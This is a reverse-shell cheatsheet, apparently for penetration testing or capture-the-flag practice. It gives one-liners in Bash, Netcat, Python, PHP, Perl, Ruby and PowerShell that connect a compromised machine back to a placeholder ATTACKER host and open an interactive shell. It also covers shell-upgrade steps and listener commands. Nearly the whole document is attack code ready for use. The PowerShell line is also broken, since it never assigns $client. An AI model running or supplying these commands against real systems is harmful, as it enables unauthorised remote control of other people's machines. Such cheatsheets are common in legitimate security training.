# Reverse Shells Cheatsheet

## Bash

```bash
bash -i >& /dev/tcp/ATTACKER/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
```

## Netcat

```bash
# Traditional
nc -e /bin/sh ATTACKER PORT

# Without -e
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ATTACKER PORT >/tmp/f

# Busybox
busybox nc ATTACKER PORT -e sh
```

## Python

```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Short
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

## PHP

```php
php -r '$sock=fsockopen("ATTACKER",PORT);exec("sh <&3 >&3 2>&3");'
php -r '$sock=fsockopen("ATTACKER",PORT);shell_exec("sh <&3 >&3 2>&3");'
```

## Perl

```perl
perl -e 'use Socket;$i="ATTACKER";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");'
```

## Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER",PORT).to_i;exec sprintf("sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## PowerShell (Windows)

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Upgrade Shell

```bash
# Get interactive shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background with Ctrl+Z, then:
stty raw -echo; fg

# Set terminal
export TERM=xterm
export SHELL=/bin/bash
```

## Listener

```bash
# Netcat
nc -lvnp PORT

# With rlwrap (better shell)
rlwrap nc -lvnp PORT

# Pwncat (auto-upgrade)
pwncat-cs -lp PORT
```
